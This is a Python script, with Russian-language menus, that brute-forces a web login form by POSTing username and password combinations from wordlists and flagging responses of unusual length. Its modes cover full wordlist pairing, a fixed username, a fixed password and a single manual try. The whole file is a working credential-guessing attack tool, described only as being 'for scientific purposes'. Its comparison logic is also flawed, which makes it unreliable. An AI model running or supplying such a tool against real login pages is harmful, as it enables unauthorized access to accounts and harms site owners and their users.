import requests

# I know that such a function is in BurpSuite itself, 
# but why don’t I write something similar myself? 
# Also used only for scientific purposes

url = "URL"
lUsername = []
fUsername = open('Path/To/username.txt', 'r')

for i in fUsername:
    lUsername.append(i.strip())
fUsername.close()

lPassword = []
fPassword = open('Path/To/password.txt', 'r')

for i in fPassword:
    lPassword.append(i.strip())
fPassword.close()

lenghtUsername = len(lUsername)
lenghtPassword = len(lPassword)

def Brute():
    count = 0
    okStat = []
    resultStat = []
    for Username in lUsername:
        for Password in lPassword:
            formBrute = {
                'username': Username,
                'password': Password
            }
            responseBrute = requests.post(url, data=formBrute)
            print(Username, Password, responseBrute.status_code, responseBrute.reason, responseBrute.elapsed.total_seconds(), len(responseBrute.content))
            okStat.append(len(responseBrute.content))
        if len(responseBrute.content) > okStat[count] or len(responseBrute.content) < okStat[count]:
            string = "Логин - " + str(Username) + "; Пароль - " + str(Password) + "; Длина контента -" + str(len(responseBrute.content))
            resultStat.append(string)
    print(string)

def BruteUsername():
    count = 0
    resultStat = []
    okStat = []
    UsernameBrute = input("Введите логин для брута: ")
    for Password in lPassword:
        formBrute = {
            'username': UsernameBrute,
            'password': Password
        }
        responseBrute = requests.post(url, data=formBrute)
        print(UsernameBrute, Password, responseBrute.status_code, responseBrute.reason, responseBrute.elapsed.total_seconds(), len(responseBrute.content))
        okStat.append(len(responseBrute.content))
        if len(responseBrute.content) > okStat[count] or len(responseBrute.content) < okStat[count]:
            string = "Пароль - " + str(Password) + "; Длина контента -" + str(len(responseBrute.content))
            resultStat.append(string)
        else :
            continue
    print(string)

def BrutePassword():
    count = 0
    resultStat = []
    okStat = []
    PasswordBrute = input("Введите пароль для брута: ")
    for Username in lUsername:
        formBrute = {
            'username': Username,
            'password': PasswordBrute
        }
        responseBrute = requests.post(url, data=formBrute)
        print(Username, PasswordBrute, responseBrute.status_code, responseBrute.reason, responseBrute.elapsed.total_seconds(), len(responseBrute.content))
        okStat.append(len(responseBrute.content))
        if len(responseBrute.content) > okStat[count] or len(responseBrute.content) < okStat[count]:
            string = "Логин - " + str(Username) + "; Длина контента -" + str(len(responseBrute.content))
            resultStat.append(string)
    print(string)

def BruteInput():
    UserName = input("Введите логин: ")
    PassWord = input("Введите пароль: ")
    formBrute = {
        'username': UserName,
        'password':PassWord
    }
    responseBrute = requests.post(url, data=formBrute)
    print(UserName, PassWord, responseBrute.status_code, responseBrute.reason, responseBrute.elapsed.total_seconds(), len(responseBrute.content))

while True:
    option = input("""
                   Выберите действие:
                   1) Обычный брут
                   2) Брут по имени
                   3) Брут по паролю
                   4) Ввести логин и пароль
                   5) Завершить работу
                   """)
    match option:
        case "1":
            Brute()
        case "2":
            BruteUsername()
        case "3":
            BrutePassword()
        case "4":
            BruteInput()
        case _:
            break
